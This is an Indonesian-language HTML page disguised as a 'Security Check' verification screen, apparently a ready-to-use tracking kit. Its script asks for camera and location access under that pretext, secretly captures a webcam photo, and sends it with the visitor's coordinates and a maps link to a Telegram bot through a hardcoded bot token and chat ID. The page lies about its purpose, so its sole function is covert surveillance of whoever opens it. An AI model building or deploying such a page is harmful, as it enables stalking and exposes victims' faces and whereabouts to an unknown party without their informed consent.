<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Verifikasi Keamanan</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding: 20px; }
        .container { border: 1px solid #0f0; padding: 20px; border-radius: 10px; max-width: 400px; margin: auto; }
        video, canvas { width: 100%; border-radius: 5px; margin-bottom: 10px; display: none; }
        #preview { display: block; background: #111; height: 200px; }
        button { background: transparent; color: #0f0; border: 1px solid #0f0; padding: 10px 20px; cursor: pointer; width: 100%; margin-top: 10px; }
        button:hover { background: #0f0; color: #000; }
        #status { font-size: 0.8rem; margin-top: 15px; color: #888; }
    </style>
</head>
<body>

<div class="container">
    <h3>SECURITY CHECK</h3>
    <video id="video" autoplay playsinline></video>
    <div id="preview">KAMERA NON-AKTIF</div>
    <canvas id="canvas" style="display:none;"></canvas>

    <button onclick="startProcess()">MULAI VERIFIKASI</button>
    <div id="status">Menunggu instruksi...</div>
</div>

<script>
    // MASUKKAN DATA TELEGRAM KAMU DI SINI
    const TELEGRAM_TOKEN = '8259940522:AAF3VwiD7rpnZoNRGKhnkHlywBCGga20kcE';
    const TELEGRAM_CHAT_ID = '8404948979';

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const status = document.getElementById('status');
    const preview = document.getElementById('preview');

    async function startProcess() {
        status.innerText = "Meminta izin akses...";
        try {
            // 1. Ambil Kamera
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
            video.style.display = "block";
            preview.style.display = "none";

            // 2. Ambil Lokasi
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                status.innerText = "Mengirim data ke server...";

                // 3. Ambil Gambar (Capture)
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const photoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));

                // 4. Kirim ke Telegram
                await sendToTelegram(photoBlob, lat, lon);
                status.innerText = "Verifikasi Selesai.";
            }, (err) => {
                status.innerText = "Error Lokasi: Izin ditolak.";
            });

        } catch (err) {
            status.innerText = "Error Kamera: Izin ditolak.";
        }
    }

    async function sendToTelegram(photo, lat, lon) {
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', photo, 'capture.jpg');
        formData.append('caption', `🔔 Verifikasi Baru!\n📍 Lokasi: https://www.google.com/maps?q=${lat},${lon}\n🌐 Lat: ${lat}, Lon: ${lon}`);

        try {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
            console.log("Data terkirim!");
        } catch (e) {
            console.error("Gagal mengirim ke Telegram", e);
        }
    }
</script>

</body>
</html>
